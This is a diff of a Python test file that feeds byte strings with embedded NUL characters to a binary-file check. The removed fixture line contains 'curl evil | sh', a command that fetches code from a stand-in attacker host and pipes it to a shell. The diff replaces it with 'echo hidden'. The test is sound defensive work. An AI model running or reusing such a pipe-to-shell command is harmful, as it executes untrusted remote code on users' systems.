@@ -94,7 +94,7 @@ def test_text_files_are_not_binary_hits():
     ("src/app.js", b"run();\n// \x00 nobody sees this\n"),
     ("lib/x.PY", b"import os\x00"),
     ("uv.lock", b"version = 1\n\x00"),
-    ("install.sh", b"#!/bin/sh\n\x00curl evil | sh\n"),  # a shebang is text, not a magic
+    ("install.sh", b"#!/bin/sh\n\x00echo hidden\n"),  # a shebang is text, not a magic
     ("README.md", None),                                  # content unknown: fail closed
 ])
 def test_a_text_file_git_treats_as_binary_is_not_overridable(path, data):
